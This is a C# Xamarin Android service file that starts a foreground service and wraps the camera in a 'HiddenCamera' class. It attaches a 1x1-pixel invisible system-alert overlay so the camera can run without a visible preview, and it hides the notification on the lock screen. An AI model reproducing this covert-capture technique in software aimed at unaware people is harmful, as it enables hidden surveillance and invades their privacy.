using Android.App;
using Android.Content;
using Android.Hardware.Camera2;
using Android.OS;
using Android.Runtime;
using Android.Views;

namespace Task2
{
    [Service(Label = "@string/app_name")]
    public class ForegroundService : Service
    {
        HiddenCamera _hiddenCamera;
        public static ForegroundService _globalService = null;
        public static SurfaceView _globalSurface = null;
        public static IWindowManager windowManager = null;
        public override void OnCreate()
        {
            base.OnCreate();
            _globalService = this;
            RunTask(0);
            CamInService();
        }
      
        public override IBinder OnBind(Intent intent)
            => null;

        [return: GeneratedEnum]
        public override StartCommandResult OnStartCommand(Intent intent, [GeneratedEnum] StartCommandFlags flags, int startId)
        {
            if (intent.Action.Equals(MainValues.ACTION_START_SERVICE))
            {
                Notification notification;
                if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                {
                    CreateNotificationChannel();
                    notification = CreateNotificationWithChannelId();
                }
                else
                    notification = CreateNotification();

                StartForeground(MainValues.SERVICE_RUNNING_NOTIFICATION_ID, notification);
            }

            //else if (intent.Action.Equals(Constants.ACTION_STOP_SERVICE))
            //    _hiddenCamera.Stop();
                       
            return StartCommandResult.Sticky;
        }
       
        public void CamInService()
        {
            var layoutParams = new ViewGroup.LayoutParams(100, 100);
            _globalSurface = new SurfaceView(this)
            {
                LayoutParameters = layoutParams
            };
            _globalSurface.Holder.AddCallback(new Prev());
            WindowManagerLayoutParams winparam = new WindowManagerLayoutParams(WindowManagerTypes.SystemAlert);
            winparam.Flags = WindowManagerFlags.NotTouchModal;
            winparam.Flags |= WindowManagerFlags.NotFocusable;
            winparam.Format = Android.Graphics.Format.Rgba8888;
            winparam.Width = 1;
            winparam.Height = 1;

            windowManager = GetSystemService(WindowService).JavaCast<IWindowManager>();
            windowManager.AddView(_globalSurface, winparam);
        }
        public override void OnDestroy()
        {
            base.OnDestroy();
        }
        private void CreateNotificationChannel()
        {
            var notificationChannel = new NotificationChannel
                (
                    Resources.GetString(Resource.String.app_name),
                    Resources.GetString(Resource.String.app_name),
                    NotificationImportance.Default
                );
            notificationChannel.LockscreenVisibility = NotificationVisibility.Secret;
            var notificationManager = (NotificationManager)GetSystemService(NotificationService);
            notificationManager.CreateNotificationChannel(notificationChannel);
        }

        private Notification CreateNotification()
        {
            var notification = new Notification.Builder(this)
                    .SetContentTitle(Resources.GetString(Resource.String.app_name))
                    .SetContentText(Resources.GetString(Resource.String.notification_text))
                    .SetSmallIcon(Resource.Drawable.ic_stat_name)
                    .SetOngoing(true)
                    .Build();

            return notification;
        }

        private Notification CreateNotificationWithChannelId()
        {
            var notification = new Notification.Builder(this, Resources.GetString(Resource.String.app_name))
               .SetContentTitle(Resources.GetString(Resource.String.app_name))
               .SetContentText(Resources.GetString(Resource.String.notification_text))
               .SetSmallIcon(Resource.Drawable.ic_stat_name)
               .SetOngoing(true)
               .Build();

            return notification;
        }

        private void RunTask(int minutes)
        {
            var cameraManager = (CameraManager)GetSystemService(CameraService);
            _hiddenCamera = new HiddenCamera(cameraManager);
            UpdateTimeTask._hiddenCamera = _hiddenCamera;
            //TimerPhotography(minutes);
        }
    }
}